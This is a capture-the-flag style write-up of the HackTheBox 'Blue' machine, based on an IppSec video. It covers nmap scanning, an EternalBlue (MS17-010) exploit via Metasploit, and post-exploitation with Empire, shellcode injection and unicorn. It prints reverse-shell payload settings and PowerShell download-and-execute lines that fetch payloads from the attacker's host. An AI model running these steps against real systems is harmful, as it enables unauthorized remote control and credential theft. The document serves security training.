---
published: true
---
Disassembly of IppSec’s youtube video HackTheBox - Blue. A crash course in NMAP and the strength it has in enumeration. Exploitation crash course with Metasploit & Empire, fixing unicode with xxd. Using unicorn to elevate meterpreter shell to stdapi.


----------

Legal Usage:
*The information provided by execute@will is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risks/responsibilities.*


![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556858657336_image.png)


This series of write-up will contain comprehensive write-ups of hackthebox machines. In an effort to sharpen reporting techniques and help solidify the understand and methodologies used during penetration testing.


# Enumeration
    nmap -sC -sV -oA nmap-scripts 10.10.10.40

-*sC = default scripts*
*-sV = enumerate versions*
-*oA = ouput all formats*
*nmap-scripts = saves file named nmap-scripts*
(results)

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556859082025_image.png)


The Microsoft security bulletin for Eternal Blue is MS17-010 which allows an attacker to send a crafted SMB message to the service and execute remote code.

more information found at Microsoft secuity page:
https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010


## searching for MS17-010 nmap script

at first searching the box for “lue” as unaware if there is a lower case b or an upper case B and grepping for the nmap file extention “.nse$”. To then switching to the vulnerability code and grep for nmap file extention.

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556859384331_image.png)

*discovered the scripts exisits at* `*/usr/share/nmap/scripts/smb=vuln-ms17-010.nse*`

## inspecting the nmap script

Moving to inspect the script and verify that the categories do include “safe”

    less /usr/share/nmap/scripts/smb=vuln-ms17-010.nse

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556859501227_image.png)

## nmap scanning all “safe” scripts

To scan with all safe scripts against a target:

    nmap -p 445 --script safe -Pn -n 10.10.10.40

*-Pn = disable ping*
*-n = disable DNS resolution*

Running safe scripts will take quite a bit of time as it runs multiple scripts against the target.

## searching nmap scripts&sorting

To continue searching what the all the “categories” are in the the nmap script folder:

    grep -r categories /usr/share/nmap/scripts/*.nse

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556859936322_image.png)


if we just want to see the “categories”  we can search for everything between quotes:

    grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP '".*?"'

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556860069436_image.png)


sorting this list with `sort`:

    grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP '".*?"' | sort -u

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556860141587_image.png)


*this a list of all types of scripts are available with nmap.*

to grab just one “catergory” from above and show a list:

    grep -r categories /usr/share/nmap/scripts/*.nse | grep default | awk -F '{print $1}'

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556860803195_image.png)

*Lists all the “default” scripts, which can be changed for any of the above types.*

## return to results from “safe” nmap

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556860896503_image.png)

*There is quite a bit of information that was returned.*

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556860983905_image.png)

*returns the Eternal Blue “ms17-010” as “VULNERABLE”.*

## nmap with “vuln and safe”
To target this “safe” enumeration to include “vuln” syntax:

    nmap -p 445 --script "vuln and safe" -Pn -n 10.10.10.40

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556861162122_image.png)

# Exploiting
## Metasploit
I know of two ways to launch metasploit:

    msfdb run # loads the postgress server as well.
    msfconsole # stardard launching

Search for Eternal Blue - ms017-010

    search ms17-010

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556862612710_image.png)

Use exploit:

    use exploit/windows/smb/ms17_010_eternalblue

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556862755720_image.png)

show options;

    show options

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556862799716_image.png)

Set payload:

    set payload windows/x64/meterpreter/reverse_tcp

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556862850793_image.png)

Set LHOST

    set LHOST tun0

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556862914682_image.png)

Set RHOST

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556862962310_image.png)

Exploit

    exploit -j

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556863027658_image.png)

*meterpreter session opened!*

List all sessions

    sessions -i

Interact with shell

    1
    shell

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556863794901_image.png)

# EMPIRE Framework

Empire is a POST-exploitation windows tool.

in directory of choice `/opt/Empire`

    git clone https://github.com/EmpireProject/Empire -b dev

*development branch is recommened as there is better quality of life improvements*

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556864191200_image.png)

## install empire

change directory to `/setup` and execute `install.sh`

    ./install.sh

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556864320893_image.png)

*hit [enter] for random password generation*

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556864365652_image.png)

## execute empire

from `/opt/Empire`

    ./empire

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556864469853_image.png)

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556864492150_image.png)

help to figure out all the commands available:

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556864543016_image.png)

## setup listeners
This is the first command always run:

    listeners

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556864622197_image.png)

    uselistener # tab a few times to see all the types of listerners

*using the “http” listener*

    uselistener http

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556864725365_image.png)

run info - similar to show options on msf

    info

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556864764531_image.png)

*we need to change the host and port.*

    set Host http://10.10.14.16:443
    set Port 443

*10.10.14.16 is the local ip port 443 is normally allowed outside of firewalls*

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556864922930_image.png)

to start listener:

    execute

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556864956126_image.png)

back out of listener

    back

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556865024239_image.png)

generate powershell payload

    launcher powershell http

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556865063024_image.png)

On local box make a directory called `/http` and create a file name `empire.ps1`

    vi empire.ps1

paste power shell output

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556868222407_image.png)

## using stagers
alternatively like launchers there are stagers

    usestagers

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556868652461_image.png)


 *we have duck, hta, bat, vbs, macros, macroless_msword files*

## sending empire.ps1
setup local http server

    python -m SimpleHTTPServer 80

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556868456691_image.png)

target meterpreter shell download file:

    powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.114.16/empire.ps1')"

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556868557476_image.png)

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556868578235_image.png)

*verified that the file was send from the local web-server.*

back out to main menu

    back
    agents

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556868713616_image.png)

*our target machine is now hooked. Empire is different in that based off the delay is when our target contacts the “mothership” to retrieve commands.*

To change the frequency/delay

    sleep
    sleep all 1
    agents 

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556868839908_image.png)

## interacting with agents
    interact M9N3T5HS

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556868910497_image.png)

show modules (tab x2) lists all available modules

    usemodule

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556868978576_image.png)

## empire privesc module
    usemodule privesc/

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556869026003_image.png)

    usemodule privesc/powerup/allchecks
    execute

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556869073197_image.png)

*job will start once the agent pulls back to the “mothership” empire CnC server. Will show the results in the window when it has finished.*

## mimikatz module
head back one level and help

    back
    help

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556869204216_image.png)

alternatively, use searchmodule

    searchmodule mimikatz

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556869247740_image.png)

*under mainly credentials*

## display empire running jobs
    jobs

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556869313195_image.png)

*awaiting return of “allchecks”0*

## adding modules to Empire
for instance if you wanted to run the `Sherlock.ps1` from @_Rastamouse 
github link: https://github.com/rasta-mouse/Sherlock


## fixing unicode on a ps1 file

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556869917489_image.png)

*unicode issues exist on the first line of the file.*

use xxd to create a hex verison of the Sherlock.ps1

    xxd -ps Serlock.ps1 > Sherlock.ps1.hex

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556869991278_image.png)

    vi Serkock.ps1.hex

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556870078662_image.png)

*delete the first 6 characters*

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556870106300_image.png)

convert the hex back to ps1

    xxd -r -ps Serlock.ps1.hex > Sherlock.ps1

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556870193108_image.png)

    less Sherlock.ps1

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556870231530_image.png)

*unicode issue has been resolved.*

## return to invoke “allchecks”

results from the “allchecks”

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556870341217_image.png)

*returned a significant number of results as we are already system with the exploit.*

## lost limit
This feature will continue to connect to agent and if lost for a certain specified time the client will uninstall.

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556870459599_image.png)

*Normally set to 4440 which is about 24hrs.*

## scriptcmd & scriptimport

cmd exeuctes a function that has been previously imported and import send s a new powershell script to keep in memory. 

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556870590306_image.png)


importing Sherlock.ps1

    scriptimport /opt/win_privesc/Sherlock/Sherlock.ps1

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556870676868_image.png)

run Sherlock.ps1

    scriptcmd Find-AllVulns

*Find-AllVulns is parameter inside the Sherlock.ps1*

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556870807066_image.png)

(results)

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556870830870_image.png)

## pass an object from Empire to Metasploit
Stated at this point this might get a bit tricky…
Create a new meterpreter listener within Empire:

    uselistener meterpreter

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556870985491_image.png)

*add the Host and Port and execute.*
go back and interact with previous session

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556871059955_image.png)

Re-setup Metasploit
ctrl+c to terminate 

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556871139171_image.png)

setup exploit handler

    use exploit/multi/handler
    set paytload windows/x64/meterpreter/reverse_http
    show options

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556871209463_image.png)

set LHOST and LPORT

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556871252950_image.png)

back on Empire issue a ps command to list processes

    ps

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556871327784_image.png)

*pick a process running as a particular user level.*

head back to main and injectshellcode

    injectshellcode meterpreter 1824

*pid of the process we want to inject.*

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556871509110_image.png)

show info

    info

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556871543818_image.png)

set payload

    set Payload reverse_http
    execute

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556871605114_image.png)

on Metasploit multi/handler session is received

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556871646911_image.png)

seeing commands available 

    help

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556871706672_image.png)

*there should be a longer list of options to use but it was stated that this version of the exploit doesn’t support x64 and is more geared toward x86 system*

## spawning 32bit process
Empire:

    usemodule managemetn/runas
    info

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556871867729_image.png)

set Cmd C:\windows\syswow64\cmd.exe 

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556871922285_image.png)

*when attempting to execute the framework is asking for a Username or CredID.*

IppSec workaround using unicorn:
github link: https://github.com/trustedsec/unicorn

    ./unicorn --help

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556872062620_image.png)

    python unicorn.py windows/meterpreter/reverse_http 10.10.14.16 8002

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556872115525_image.png)

Metasploit, background session and create 32bit handler and change LPORT

    set paytload windows/meterpreter/reverse_http
    set LPORT 8002
    exploit -j

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556872339190_image.png)

Empire, injectshellcode with 32bit change Port and Host

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556872402582_image.png)

back and interact with agent

    injectcode meterpreter1 2992 info

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556872469550_image.png)

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556872631247_image.png)

*set LPORT as 8002*

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556872717215_image.png)

Successful response back to metasploit:

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556872744436_image.png)

interact with session 3

    sessions -i 3

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556872788873_image.png)

    help

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556872815110_image.png)

*still don’t have the standard api but we can attempt to load it manually.*

    load stdapi

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556872850761_image.png)

*msf at this point crashes*

## unicorn for the full stdapi
pivots to unicorn and an output code called `powershell_attack.txt`

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556872908875_image.png)

send this file to our target with a simplehttpserver.

    cp /opt/unicorn/powershell_attack.txt .

Empire, head back and use command “shell” which performs powershell commands.

    shell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/powershell_attack.txt')

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556873133164_image.png)

connection is established:

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556873154579_image.png)

backgound our session 3 and enter session 4

    ctrl+c
    sessions -i 4

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556873239089_image.png)

![](https://paper-attachments.dropbox.com/s_28C056C16ADAFDB58ADAF02C1C99B3F8C406B0B274495B5ACDDDA71371767BCA_1556873255550_image.png)

*at this point we have full standard api functionality with all the bells and whistles.*


----------

 If you don’t know who ippsec is check him out at https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
 
 Twitter: https://twitter.com/ippsec

